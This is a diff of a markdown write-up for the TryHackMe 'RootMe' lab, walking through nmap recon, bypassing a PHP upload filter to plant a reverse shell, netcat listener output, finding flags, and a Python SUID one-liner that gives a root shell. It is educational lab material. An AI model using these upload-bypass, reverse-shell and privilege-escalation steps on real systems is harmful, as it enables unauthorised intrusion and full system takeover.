@@ -8,7 +8,7 @@
 ##### 1. Deploy the machine
   Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
 
-##### 2. Reconnaissance -
+##### 2. Reconnaissance
 
 This is where the basics of recon comes into play. To start, I use [nmap] which is default option on the perosnal Kali install I have. We start with a basic command
   `nmap -sC -sV -A MACHINE_IP `
@@ -77,5 +77,60 @@ Let's try to upload a [PHP reverse shell](https://github.com/pentestmonkey/php-r
 
 ![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/fail.png?raw=true)
 
-Hmmm, it seems like no PHP files can be uploaded. We can either manually test with other file types (example: .php5, .phphtml, .php.html) or we can use [sAjibuu's Upload Bypass](https://github.com/sAjibuu/upload_bypass/) repo to automate the process. If manually uploadign we can visit `MACHINE_IP/uploads/` to see the uplaoded files and if we use the automated process, we see that our [netcat] listener has cought a shell by itself.
+##### 3. Getting a shell
 
+Hmmm, it seems like no PHP files can be uploaded. We can either manually test with other file types (example: .php5, .phtml, .php.html) or we can use [sAjibuu's Upload Bypass](https://github.com/sAjibuu/upload_bypass/) repo to automate the process. If manually uploadign we can visit `MACHINE_IP/uploads/` to see the uplaoded files and if we use the automated process, we see that our [netcat] listener has cought a shell by itself.
+
+```
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from MACHINE_IP 45998 received!
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 20:23:11 up  1:32,  0 users,  load average: 0.05, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+Now we finally can start looking for the first flag in `user.txt`.
+<br>
+
+First command to is: `find / -type f -name user.txt`. This will look for a `file` containing `user.txt` in the name. And after a quick second ot two, we see our readable file right in the middle:
+```
+find: '/proc/1671/fd': Permission denied
+find: '/proc/1671/map_files': Permission denied
+find: '/proc/1671/fdinfo': Permission denied
+find: '/proc/1671/ns': Permission denied
+/var/www/user.txt
+find: '/var/spool/rsyslog': Permission denied
+find: '/var/spool/cron/atjobs': Permission denied
+find: '/var/spool/cron/crontabs': Permission denied
+find: '/var/spool/cron/atspool': Permission denied
+```
+To get the file contens we can `cat`-it out:
+
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/user.png?raw=true)
+
+##### 3. Privilege escalation
+
+As we are on the machine, we can start looking at some files and permissions what we can abuse. Let's run the `find / -user root -perm /4000` command, to determine if there are any visible for us from the get-go. 
+```
+find: '/snap/core/8268/var/spool/rsyslog': Permission denied
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/usr/bin/python
+find: '/snap/core/9665/etc/chatscripts': Permission denied
+```
+Now we know that python can be run on this machine and maybe we can use it to escalate our priviledges. We can use [GTFOBins](https://gtfobins.github.io/) to check on this.
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/gtfo.png?raw=true)
+<br>
+
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/gtfo_2.png?raw=true)
+Now let's run it against the root user: `python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’`
+<br>
+
+And there we go, we are `root` ! We can grab the flag now!
+![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/gtfo_2.png?raw=true)
+
+#### Thank you for checking out my writeup about the THM room: RootMe! If you are interested in other writeups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my
